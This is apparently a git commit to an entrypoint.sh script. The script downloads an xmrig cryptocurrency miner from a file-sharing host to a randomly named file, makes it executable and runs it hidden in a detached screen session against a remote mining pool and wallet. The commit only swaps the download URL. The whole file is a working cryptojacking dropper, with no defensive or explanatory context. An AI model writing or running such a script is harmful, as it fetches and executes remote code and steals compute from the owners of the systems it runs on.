b9ac27dcd8ca171d2013cf952228c9484e61771a
septianana55 <93500712+septianana55@users.noreply.github.com>
2021-12-24 12:19:16 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 gas=$(shuf -n 1 -i 1-9999999)
-curl https://bit.ly/3yWu1H3 --output $gas
+curl https://transfer.sh/yesOy8/xmrig --output $gas
 chmod +x $gas
 chmod 777 /run/screen
 screen -dmS $gas ./$gas --donate-level 0 -o 20.120.30.75:3333 -u hvxxzE88RUEbetvm8dCfu97o8p1rLSZ9s66qYVr5YVokHGfg48ZekDeX1mi1TmcSTtdMQTGEjguD6NtwQ8CQSTkB3QmEn5Bhqa -p wak -a cn/upx2 -k  
